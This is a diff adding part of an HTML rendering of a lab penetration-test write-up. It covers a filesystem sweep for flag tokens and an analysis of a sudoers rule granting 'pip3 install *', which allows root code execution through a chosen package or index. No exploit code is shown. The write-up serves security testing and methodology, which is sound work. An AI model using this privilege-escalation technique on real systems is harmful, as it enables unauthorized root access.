+<td>17,563 files / <strong>316,301,973 bytes</strong> (≤ 4 MB; <code>/proc /sys /run /tmp</code> excluded; this engagement's own <code>dl162-*</code> artefacts excluded)</td>
+<td><strong>0 files</strong></td>
+</tr>
+<tr>
+<td>Same patterns over binaries, <code>grep -a</code></td>
+<td>14 files / <strong>183,847,550 bytes</strong></td>
+<td><strong>0 files</strong></td>
+</tr>
+<tr>
+<td><strong>Total</strong></td>
+<td><strong>17,577 files / 500,149,523 bytes, 6 patterns</strong></td>
+<td><strong>0</strong></td>
+</tr>
+<tr>
+<td><code>/root</code> as <code>uid=0</code></td>
+<td><code>ls -la</code></td>
+<td>3 shipped dotfiles + 2 artefacts this engagement created. No other file</td>
+</tr>
+<tr>
+<td>Web root, read in full</td>
+<td><code>index.html</code>, <code>notes/note.txt</code>, <code>index.png</code> chunk table</td>
+<td>no token; <code>index.png</code> has no <code>tEXt</code>/<code>iTXt</code>/<code>zTXt</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Positive controls for the sweep, both green:</strong> pattern <code>Ubuntu</code> → <strong>51 files</strong>; and on
+the binary pass, a marker appended to a copy of <code>/usr/bin/python3.8</code> → <strong>1 line</strong>.</p>
+<p><strong>§26 was live here and it is worth naming.</strong> The <em>first</em> sweep reported <strong>1</strong> hit for
+every pattern, and the file was <strong><code>/tmp/reward.sh</code> — my own search script</strong>, which
+contains <code>FLAG{</code> inside its own pattern. Excluding <code>/tmp</code> and my own artefacts took it
+to 0. A pattern distinctive enough to be a reward (<code>FLAG{</code>) is distinctive enough to
+find the searcher.</p>
+<hr />
+<h2 id="12-what-this-lab-adds-to-the-methodology">12. What this lab adds to the methodology</h2>
+<p><strong>The class — the install path as attack surface.</strong> Absent from 58 writeups: <code>pip install</code> appears in <strong>none</strong> of them, and neither does dependency confusion or a
+&quot;version selector&quot;.</p>
+<p><strong>Entry criterion.</strong> <em>An attacker who controls what gets installed does not need a
+vulnerability in the application.</em> The corollary is the half that is easy to get wrong:
+<strong>there may be no application.</strong> Lab 162 has three files (and one subdirectory) in its docroot and a static
+HTML page; the entire finding is a policy line. A tester who starts by looking for a
+vulnerability in an application will not find one, and may conclude the lab is empty.</p>
+<p><strong>The boundary is drawn at whatever decides the version.</strong> Here that is one token in a
+<code>sudoers</code> file: <code>install *</code>. <code>install</code> is pinned; the specifier is not. Naming the
+program is not the boundary — <strong>naming the selector is.</strong></p>
+<p><strong>The sudoers discriminator, now at four data points.</strong> Lab 93: an interpreter with no
+argument list is arbitrary code. Lab 189: an undeclared grant with no argument
+restriction. Lab 282: a grant that pins both arguments, 8 of 9 forms denied. <strong>Lab 162:
+<code>install *</code> — 6 of 14 forms allowed, and the 6 allowed include every form that names a
+different artifact or a different index.</strong> The discriminator remains the <strong>argument
+specification</strong>, never the nature of the program. <code>pip3</code> is not an interpreter the way
+<code>debugfs</code> is not; it is dangerous for the same structural reason, and the way to tell is
+to enumerate forms, not to reason about the binary.</p>
+<p><strong>Two measured details the man page would not have given me.</strong> <code>*</code> spans <strong>spaces</strong>
+(<code>install --target /tmp/x --help</code> is allowed), and <code>sudo</code> does <strong>not</strong> launder a shell,
+so <code>$IFS</code> reaches pip literally. Anyone writing this rule from memory would get the
+first wrong and might over-claim the second.</p>
+<p><strong>And the lab's own receipts.</strong> <code>/root/.bash_history</code> contains <code>pip3 install uncompyle6</code>,
+run by root while the lab was being built, on the same machine whose sudoers file grants
+<code>pip3 install</code> to a user. The class was sitting in the build history of the target,
+one indentation level away from being the vulnerability — which is §188's
+&quot;the credential lives in the build layer&quot; arriving as a <em>technique</em> rather than a leak.</p>
+
+</main>
+<footer><p><strong>The markdown in the repository is the authority.</strong> This site is a rendering of it. Where the two disagree, the repository is correct and this page is wrong &mdash; report it as a build defect, not as a finding.</p><p>Target-internal paths, container addresses and cookie identifiers are redacted in this rendering. The repository markdown is unredacted.</p><p>Counts on this site are read out of the source files at build time, and the renderer is <code>markdown-it-py</code>. Nothing on this page was written by hand except this footer, the homepage and the stylesheet.</p></footer>
+</body>
+</html>
